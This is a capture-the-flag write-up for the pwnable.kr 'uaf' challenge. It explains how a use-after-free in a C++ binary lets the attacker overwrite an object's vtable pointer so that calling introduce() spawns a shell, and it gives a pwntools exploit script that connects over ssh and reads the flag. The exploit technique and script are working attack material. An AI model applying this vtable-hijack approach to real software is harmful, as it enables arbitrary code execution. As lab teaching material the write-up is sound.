Note: a vtable is associated to a class, and allocated objects of the class in the heap (with the new keyword) will include a chunk containing their vtable address. vtables are present in the binary. 

When we want to call functions defined inside the class, their addresses will be found in the vtable corresponding to the address present in the object's heap chunk.

In this challenge, after freeing the chunks, we can overwrite the chunks of size ``0x20`` (that contain vtable address) by the content of the file passed in argv[2]. We will specify a size of 0x18 to ensure it is the 0x20 chunks that are going to be reused (it will be 16-bit aligned).

Moreover, we have a use after free vulnerability: ``Man::introduce()`` can still be called after the free. We are going to exploit this by modifying the address of the vtable used by the ``m`` object.

introduce is the second function for Man vtable. We have:
``*(man_vtable+0x10)``   is ``give_shell`` address
``*(man_vtable+0x10+8)`` is ``introduce`` address

Note: first function in the vtable is after a 0x10 offset. In the heap, it is ``vtable+0x10`` that is stored.

If we decrease ``(vtable+0x10)`` address by 8, trying to call ``m->introduce`` will result in calling ``m->give_shell``.

first function of the old vtable (give_shell) :
```python
old_vtable_1F =  elf.symbols["_ZTV3Man"]+0x10```
give_shell takes the place of introduce as second function :
```python
new_vtable_1F =  old_vtable_1F-8
```

```python
from pwn import *
elf = ELF("uaf")
shell = ssh("uaf", "pwnable.kr", password="guest", port=2222)
wp = shell.process(["cat", "/dev/stdin", ">>", "/tmp/payload"])
wp.send(p64(new_vtable_1F))
wp.close()

p = shell.process(["./uaf", "24", "/tmp/payload"])
print p.recv()
p.sendline("3") 
print p.recv()
p.sendline("2") 
```
It's w heap chunk that is going to be reused the first time. So we have to store the payload twice, since ``m->introduce`` is called before ``w->introduce``
```python
print p.recv()
p.sendline("2")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("cat flag")
print p.recv()
```
